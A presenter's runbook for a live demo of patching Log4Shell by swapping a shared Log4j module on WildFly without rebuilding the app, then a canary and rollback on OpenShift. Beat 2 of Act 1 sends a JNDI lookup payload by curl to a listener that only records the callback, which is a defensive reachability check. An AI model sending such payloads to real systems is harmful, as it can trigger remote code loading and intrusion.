# Demo Runbook — what to run, what to say, what they see

> **Running this live? Use `scripts/demo-vm.sh` and `scripts/demo-openshift.sh` instead of typing
> the commands below by hand.** Each is one script per terminal window — it narrates what it's
> about to show, types the real command out, then runs it. Everything on this page is exactly
> what those scripts automate; read on if you want the detailed manual version or the talk track
> spelled out beat by beat.

Two self-contained acts. **Act 1 (WildFly VM)** is the stronger opener because the "no rebuild"
claim becomes literally undeniable — the WAR's checksum doesn't change. **Act 2 (OpenShift)** then
shows the container-native mechanics: canary and rollback.

Total run time: ~12–15 minutes for both. Each act stands alone if you only have one environment.

---

## Before you start (once)

```bash
scripts/demo-vm.sh build_thin
```

You'll see it assert **"No Log4j inside the WAR."** Say this out loud — it's the premise for
everything: *the artifact we deploy contains only our code; the vulnerable library is supplied
separately.*

---

## Act 1 — WildFly VM: "patch without a rebuild"

**Setup (once, on the VM):**
```bash
scripts/demo-vm.sh setup_wildfly
${WILDFLY_HOME:-$HOME/wildfly-demo}/bin/standalone.sh -b 0.0.0.0 &
```

### Beat 1 — Show it's vulnerable
```bash
curl -s http://localhost:8080/api/version | jq .
```
> **Say:** "This app is running Log4j 2.14.1 — the Log4Shell version. Note it reports the version
> it's *actually running*, read from the live library, not from anything baked into the app."

The audience sees `"status": "VULNERABLE — Log4Shell (CVE-2021-44228)"`.

### Beat 2 — (Optional, visceral) Prove the vulnerability is reachable — safely
In a second terminal:
```bash
scripts/callback-listener.py 1389
```
Then:
```bash
curl 'http://localhost:8080/api/log?msg=${jndi:ldap://<VM-IP>:1389/x}'
```
> **Say:** "That listener serves nothing — it just records a connection. Watch: the vulnerable
> Log4j evaluated the lookup and called out. That's the exposure, demonstrated without
> weaponizing anything."

The listener prints a **CALLBACK RECEIVED** line.

### Beat 2.5 — (Optional) Run the REAL compatibility gate before you patch
```bash
scripts/demo-vm.sh compatibility_gate 2.14.1 2.17.1
```
> **Say:** "Before this ships, the pipeline runs an actual API/ABI diff — this is real japicmp,
> not a mockup, comparing the two real JARs." Let it run, then point at the verdict at the
> bottom: "For log4j-core 2.14.1 to 2.17.1, japicmp actually finds real structural changes — a
> removed class, a changed serialVersionUID. And because this version jump crosses a minor
> version boundary — Red Hat calls that a y-stream — it defaults to full regression anyway,
> regardless of what japicmp shows. Minor and major bumps are assumed to carry new functionality,
> not just fixes. A patch-level, z-stream fix gets the fast lane by default — but only if
> japicmp comes back clean too. Either signal alone can send it to full regression."

Then land the honest limit: "This verdict only sees structural changes — and the y/x-stream
default just did real work: Log4j's actual JNDI-lookup change landed at a minor-version boundary,
so this exact pair already gets routed to full regression regardless of what japicmp shows. The
gap this rule can't close is narrower than that: a *patch-level*, z-stream release that changes
behavior with zero structural fingerprint would still slip through as a clean fast-lane patch.
This rule reduces how often that gap matters. It doesn't close it. That's what canary and
rollback are for — including for the patches this rule fast-lanes, not just the ones it flags."

This is the slide 15 / slide 19 story made literal, and it's also a live example of the
z-stream/y-stream/x-stream routing rule from slide 18 actually running, not just described.

### Beat 3 — Patch by swapping the module
```bash
scripts/demo-vm.sh patch_vm
```
> **Say:** "Here's the whole point. I'm replacing the Log4j **server module** — the shared library
> — and restarting the server. I am **not** rebuilding the application, not redeploying it, not
> even opening it. You'll see two things change here: the JAR files, and two lines in the module's
> config pointing at them. That's deliberate — the filename carries the version number, so anyone
> can list this directory and know exactly what's deployed without opening a JAR. For an audience
> that cares about audit trails, that's worth the two-line config diff."

The script prints the WAR's **sha256 before and after** and asserts they're **IDENTICAL**.
Pause on that line — it's the money shot.

On a plain dev machine (no systemd), the script stops the server and prints the exact command to
start it again — run that now:
```bash
DEMO_PACKAGING=thin ~/wildfly-demo/bin/standalone.sh -b 0.0.0.0 &
```
> **Say:** "The files were already swapped on disk — but Java caches a loaded library for the life
> of the process, so it takes a fresh process to actually pick up the new one. That's still just a
> restart, not a rebuild or a redeploy — the artifact itself never changed, which is what the
> checksum just proved."

### Beat 4 — Show it's fixed
```bash
curl -s http://localhost:8080/api/version | jq .
```
Now `"status": "PATCHED"`, running `2.17.1`. Re-run the callback test from Beat 2 → **silence**.

> **Say:** "Same application, byte for byte. Different library underneath. That's the Thin-WAR +
> shared-module model — and it's exactly how you'd answer 'do you hot-swap jars inside my running
> app server?': no, the fix lands once in the module every deployment references."

### Beat 5 — The paperwork catches up, separately and non-blocking

This is the direct answer to "but you'd still want the version in source control, right?" — yes,
and here's how that happens without gating the fix that already shipped:

```bash
scripts/demo-vm.sh github_pr
```

> **Say:** "The app has been running the patched library since Beat 3 — this step didn't fix
> anything, it's purely paperwork. This is a real git branch and a real commit, styled the way
> Renovate actually writes them, bringing `pom.xml` in line with what's already
> live in production. It's non-blocking: if this PR sat in review for two days, the app would
> already be safe the entire time."

If `gh` is installed, authenticated, and `origin` points at GitHub, this **actually pushes the
branch and opens a real PR**, then opens it in your browser — the same GitHub UI your audience
already knows how to read. Point at the PR page itself rather than a terminal diff; that's the
whole reason this path exists. It never merges anything — the PR is left open for review, exactly
like a real Renovate PR would be.

If any of those prerequisites are missing, the script says exactly which one and falls back to a
local-only branch/commit instead — still a real `git diff` and `git log -1` on screen, just not
pushed anywhere. Say so if that happens, so nobody thinks you opened a real PR when you didn't.

> **If asked "is this what Renovate would actually do":** point at `renovate.json` in
> the repo root — it's a real, valid config, not a demo prop. Security patches get `prPriority: 10`
> and no schedule restriction; routine updates batch weekly. That's the actual policy this repo
> would run under if wired up to a live Renovate account. (Dependabot follows the same non-blocking
> pattern if that's the tool in place instead — the mechanism this demo argues for isn't tied to
> one vendor.)

---

## Act 2 — OpenShift: canary + rollback

```bash
oc project decoupled-patching-demo
scripts/demo-openshift.sh     # paced; press ⏎ to advance each beat
```

What each pause shows the audience:

| Beat | Command the script runs | What they see | What to say |
|---|---|---|---|
| Build vulnerable | `fetch-libs 2.14.1` + `oc start-build` | image builds | "Same thin WAR. Log4j 2.14.1 goes into a shared image layer." |
| Deploy | `oc apply deployment.yaml` | 3 pods, Route up | "`/api/version` says VULNERABLE." |
| Rebuild patched | `fetch-libs 2.17.1` + `oc start-build` | **only the dependency layer rebuilds** | "The thin app layer is cache-reused — the rebuild is small and fast. In a container you *do* rebuild — you just rebuild almost nothing." |
| **Canary** | `oc apply canary.yaml` + poll | traffic split: a **mix** of 2.14.1 and 2.17.1 | "One patched pod, ~25% of live traffic. We watch its health before the fleet moves." |
| **Promote** | move `:stable` tag + poll | **all** 2.17.1 | "Health gate passed. Fleet-wide, rolling, zero downtime." |
| **Rollback** | `oc tag vulnerable → stable` | back to 2.14.1 in one step | "And the safety net: any regression, one-step revert to the last known-good. The fleet is never stranded." |

> **Tie it back:** "Lightwell supplies the trusted patch; this — the canary, the health gate, the
> rollback, done as policy across the fleet — is the trusted software factory applying it."

**Cleanup:**
```bash
scripts/demo-openshift.sh cleanup
```

---

## If something goes sideways (live-demo insurance)

- **Route not resolving yet:** give it 10–20s; `oc get route demo`.
- **Build can't reach Maven Central:** pre-run `scripts/demo-openshift.sh fetch_libs <ver>` on a machine with
  access and commit the two JARs in `openshift/module/` before the talk; the binary build ships them.
- **Probes failing / pod not Ready:** WildFly cold start can exceed the initial delay on a busy
  cluster — bump `initialDelaySeconds` in `deployment.yaml`.
- **`jq` missing:** drop the `| jq .` — the endpoints return readable JSON already.
- **Canary shows no mix:** the Service load-balances per-connection; run the poll a few more times,
  or scale the canary to 2 replicas for a more obvious split on a small fleet.
